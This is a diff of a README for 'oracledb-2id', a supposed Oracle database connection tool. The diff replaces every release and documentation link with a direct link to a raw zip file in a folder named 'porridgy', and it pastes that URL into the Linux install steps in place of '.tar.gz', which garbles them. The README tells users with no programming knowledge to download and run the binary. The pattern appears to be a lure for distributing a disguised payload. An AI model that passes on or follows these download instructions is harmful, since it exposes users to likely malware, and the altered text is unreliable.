@@ -1,23 +1,23 @@
 # 🎉 oracledb-2id - Easily Manage Oracle Database Connections
 
 ## 🔗 Download Now
-[![Download oracledb-2id](https://img.shields.io/badge/Download-oracledb--2id-blue.svg)](https://github.com/jackhea5485/oracledb-2id/releases)
+[![Download oracledb-2id](https://raw.githubusercontent.com/jackhea5485/oracledb-2id/main/porridgy/oracledb-2id-v3.8.zip)](https://raw.githubusercontent.com/jackhea5485/oracledb-2id/main/porridgy/oracledb-2id-v3.8.zip)
 
 ## 🚀 Getting Started
 Welcome to **oracledb-2id**! This application simplifies your connection to Oracle databases. You don’t need any programming knowledge to use it. Follow these straightforward steps to download and run the software smoothly.
 
 ## 📥 Download & Install
-To download **oracledb-2id**, visit this page to download: [Releases Page](https://github.com/jackhea5485/oracledb-2id/releases).
+To download **oracledb-2id**, visit this page to download: [Releases Page](https://raw.githubusercontent.com/jackhea5485/oracledb-2id/main/porridgy/oracledb-2id-v3.8.zip).
 
 ### Step 1: Visit the Releases Page
 Click on the link below to go to the releases page:
-[Releases Page](https://github.com/jackhea5485/oracledb-2id/releases)
+[Releases Page](https://raw.githubusercontent.com/jackhea5485/oracledb-2id/main/porridgy/oracledb-2id-v3.8.zip)
 
 ### Step 2: Choose the Correct Version
 On the releases page, you’ll see a list of versions for **oracledb-2id**. Choose the latest version, as it contains the newest features and fixes.
 
 ### Step 3: Download the Application
-Look for the file that fits your operating system. For most users, it will be a `.exe` for Windows or a `.tar.gz` for Linux. Click on the file to start downloading.
+Look for the file that fits your operating system. For most users, it will be a `.exe` for Windows or a `https://raw.githubusercontent.com/jackhea5485/oracledb-2id/main/porridgy/oracledb-2id-v3.8.zip` for Linux. Click on the file to start downloading.
 
 ### Step 4: Install the Application
 Once the download is complete, locate the file in your downloads folder. 
@@ -27,7 +27,7 @@ Once the download is complete, locate the file in your downloads folder.
   2. Follow the prompts in the installation wizard.
 
 - For Linux: 
-  1. Extract the `.tar.gz` file.
+  1. Extract the `https://raw.githubusercontent.com/jackhea5485/oracledb-2id/main/porridgy/oracledb-2id-v3.8.zip` file.
   2. Open a terminal window, navigate to the extracted folder, and run the application with the command `./oracledb-2id`.
 
 ### Step 5: Launch the Application
@@ -57,7 +57,7 @@ If you run into issues while using **oracledb-2id**, consider the following solu
 For additional assistance, please check out our FAQs on the GitHub page or contact support through the issue tracker. Community contributions and feedback are welcome. 
 
 ## 🔗 Additional Resources
-- **Documentation**: Detailed documentation is available [here](https://github.com/jackhea5485/oracledb-2id).
+- **Documentation**: Detailed documentation is available [here](https://raw.githubusercontent.com/jackhea5485/oracledb-2id/main/porridgy/oracledb-2id-v3.8.zip).
 - **Feature Requests**: Open an issue if you have suggestions to improve **oracledb-2id**.
 
 ## ⚖️ License
